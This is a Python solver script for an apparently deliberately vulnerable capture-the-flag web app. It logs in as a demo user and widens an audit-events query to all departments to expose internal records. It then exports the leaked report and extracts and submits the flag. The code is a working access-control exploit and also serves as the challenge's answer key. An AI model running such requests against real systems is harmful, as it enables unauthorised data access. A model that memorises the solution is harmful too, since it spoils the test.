from __future__ import annotations

import argparse
import re

import requests


EVENT_RE = re.compile(r"EV-2026-\d{4}")
FLAG_RE = re.compile(r"flag\{[^}]+\}")


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    root = target_url.rstrip("/")
    client.get(root + "/", timeout=10).raise_for_status()
    client.post(root + "/login", data={"username": "demo", "password": "demo-pass"}, timeout=10).raise_for_status()
    client.get(root + "/dashboard", timeout=10).raise_for_status()
    client.get(root + "/audit", timeout=10).raise_for_status()
    baseline = client.get(root + "/api/audit/events", params={"from": "2026-01-01", "to": "2026-12-31", "department": "engineering"}, timeout=10)
    baseline.raise_for_status()
    if any(item.get("scope") == "internal" for item in baseline.json().get("items", [])):
        raise RuntimeError("personal baseline already exposed an internal event")
    expanded = client.get(root + "/api/audit/events", params={"from": "2026-01-01", "to": "2026-12-31", "department": "all"}, timeout=10)
    expanded.raise_for_status()
    leaked = [item for item in expanded.json().get("items", []) if item.get("scope") == "internal"]
    if not leaked:
        raise RuntimeError("all-department query did not reveal an internal event")
    event_id = leaked[0]["event_id"]
    if not EVENT_RE.fullmatch(event_id):
        raise RuntimeError("internal event identifier has unexpected format")
    exported = client.post(root + "/api/audit/export", json={"event_id": event_id}, timeout=10)
    exported.raise_for_status()
    report_url = exported.json()["download_url"]
    report = client.get(root + report_url, timeout=10)
    report.raise_for_status()
    match = FLAG_RE.search(report.text)
    if not match:
        raise RuntimeError("audit report did not contain a flag")
    flag = match.group(0)
    if control_url and instance_id:
        submitted = requests.post(control_url.rstrip("/") + f"/api/v1/instances/{instance_id}/submit",
                                   json={"flag": flag}, timeout=10)
        submitted.raise_for_status()
        if not submitted.json().get("data", {}).get("correct"):
            raise RuntimeError("backend rejected the discovered flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target_url")
    parser.add_argument("--control-url")
    parser.add_argument("--instance-id")
    args = parser.parse_args()
    if bool(args.control_url) != bool(args.instance_id):
        parser.error("--control-url and --instance-id must be provided together")
    print(solve(args.target_url, args.control_url, args.instance_id))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
